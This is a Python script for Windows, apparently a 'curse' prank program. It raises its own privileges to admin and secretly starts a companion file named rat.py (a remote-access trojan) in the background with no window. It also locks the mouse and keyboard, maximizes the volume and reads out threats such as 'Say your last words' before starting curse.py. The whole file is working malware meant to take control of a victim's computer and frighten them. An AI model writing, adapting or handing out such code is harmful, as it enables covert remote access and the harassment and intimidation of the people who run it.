import os
import sys
import ctypes
import subprocess
import threading
import time
import random
import win32api, win32con
import win32gui
import pyttsx3
from pynput import keyboard

# Request Admin Privileges Automatically
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        sys.exit()

run_as_admin()

# Maximize console window and force it to stay on top
def maximize_terminal():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                          win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)

def force_foreground():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.SetForegroundWindow(hwnd)

maximize_terminal()

# Set system volume to max
subprocess.call(["nircmd.exe", "setsysvolume", "65535"])

# Launch rat.py in the background silently
def run_rat_background():
    try:
        rat_path = os.path.join(os.getcwd(), "rat.py")
        subprocess.Popen(
            ["python", rat_path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception as e:
        print(f"[!] Failed to launch RAT: {e}")

# Force mouse to stay at center and disable movement/click
def block_mouse():
    def hold_mouse():
        while True:
            win32api.SetCursorPos((960, 540))
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
            time.sleep(0.01)
    threading.Thread(target=hold_mouse, daemon=True).start()

# Block all keys except A-Z, allow Enter only after valid input
def block_keys():
    allowed_keys = set("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    entered_chars = []
    allow_enter = [False]

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char:
                c = key.char.upper()
                if c in allowed_keys:
                    entered_chars.append(c)
                    if len(entered_chars) > 0:
                        allow_enter[0] = True
                return False
            elif key == keyboard.Key.enter:
                if allow_enter[0]:
                    allow_enter[0] = False
                    entered_chars.clear()
                    return True
                return False
            else:
                return False
        except:
            return False

    listener = keyboard.Listener(on_press=on_press, suppress=True)
    listener.start()

# Text-to-speech with loud creepy voice
def speak(text):
    engine = pyttsx3.init()
    voices = engine.getProperty('voices')
    engine.setProperty('voice', voices[1].id if len(voices) > 1 else voices[0].id)
    engine.setProperty('rate', 130)
    engine.setProperty('volume', 200.0)  # Max volume
    engine.say(text)
    engine.runAndWait()

# Ask questions using TTS and file
def ask_questions():
    try:
        with open("questions.txt", "r", encoding="utf-8") as f:
            questions = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        questions = ["You are worthless. What do you fear most?", "It's too late. Say your last words."]

    random.shuffle(questions)
    selected = questions[:5]

    answers = []
    answered = [False]

    def timeout():
        time.sleep(60)
        if not answered[0]:
            print("\nToo slow. Now suffer.")
            launch_finale()

    threading.Thread(target=timeout, daemon=True).start()
    threading.Thread(target=block_mouse, daemon=True).start()
    threading.Thread(target=block_keys, daemon=True).start()
    threading.Thread(target=force_foreground, daemon=True).start()

    print("\nAI CURSE HAS BEGUN. ANSWER THE QUESTIONS IF YOU DARE:\n")

    try:
        for q in selected:
            print(q)
            speak(q)
            ans = input("→ ")
            answers.append(ans if ans else "No answer")
    except KeyboardInterrupt:
        print("\nTrying to run won't save you...")

    answered[0] = True
    print("\nYou're done. Nothing will save you now.")
    time.sleep(3)
    launch_finale()

# Final scare - launch curse.py and exit
def launch_finale():
    script_path = os.path.join(os.getcwd(), "curse.py")
    subprocess.Popen(["python", script_path], shell=True)
    os._exit(0)

if __name__ == "__main__":
    run_rat_background()
    ask_questions()
